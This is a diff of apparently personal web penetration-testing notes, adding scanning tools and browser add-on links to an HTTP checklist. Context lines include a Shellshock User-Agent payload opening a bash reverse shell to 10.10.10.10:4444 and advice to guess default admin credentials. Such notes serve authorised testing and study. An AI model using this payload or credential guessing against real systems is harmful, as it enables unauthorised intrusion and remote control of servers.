@@ -19,12 +19,12 @@
   * [Sources](#sources)
 
 ## HTTP and HTTPS Checklist   
-- [ ] Scan page with Wappanalyzer  
+- [ ] Scan page with Wappanalyzer FireFox add-on      
 - [ ] Scan for sub directories and pages - admin pages?, login pages?, file upload?, user input fields?   
-- [ ] Check for a robots.txt page    
+- [ ] Check for robots.txt, security.txt, sitemap.xml files      
 - [ ] Test strength of encryption using nmap ssl-enum-ciphers script   
 - [ ] Look for service name and version - searchsploit / google for exploits   
-- [ ] Service specific scanners: wpscan, sqlmap     
+- [ ] Service specific scanners: wpscan, Joomscan        
 - [ ] Admin page - access misconfigs, login?       
 - [ ] Log in pages - guess default creds, admin:admin, admin:password   
 - [ ] File upload pages - what types of files are accepted?, what checks are being implemented? is there a value you can change to include a file?     
@@ -32,7 +32,8 @@
 - [ ] Intercept HTTP requests with Burp and examine    	
 
 Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
-[Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions     
+Firefox addons: script to add ons [here](https://github.com/mazen160/Firefox-Security-Toolkit)               
+[Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/)                 
 [Pen Testing Web Checklist](https://pentestbook.six2dez.com/others/web-checklist)    
 ## Scan for sub directories and pages	
 ### Wordlists 
@@ -62,7 +63,12 @@ CeWL sometimes misses directories so use these steps to create a dir list for Ce
     cat cewl_lower.txt >> cewl.txt
     #then use the CeWL wordlist for password guessing   
     
-### Scanning Tools
+### Scanning Tools    
+Nikto    
+Gobuster / Dirb / Feroxbuster   
+Ffuf /wfuzz: fuzzing tools      
+[BFAC](https://github.com/mazen160/bfac): search for backup files    
+
 Web Scanning:     
 
     nikto -h http://127.0.0.1:80/     
@@ -80,6 +86,7 @@ Page and Directory Fuzzing:
  Virtual Hosts (subdomains):   
  
     gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://site.com --append-domain             
+
     
 ### Curl 
 
@@ -127,7 +134,6 @@ Nmap script check:
 To exploit change vulnerable field in HTTP request (likely UAS) to a reverse shell command:        
     
     User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1    
-
 
 # SSRF   
 Server requests resource of behalf of the web client.    
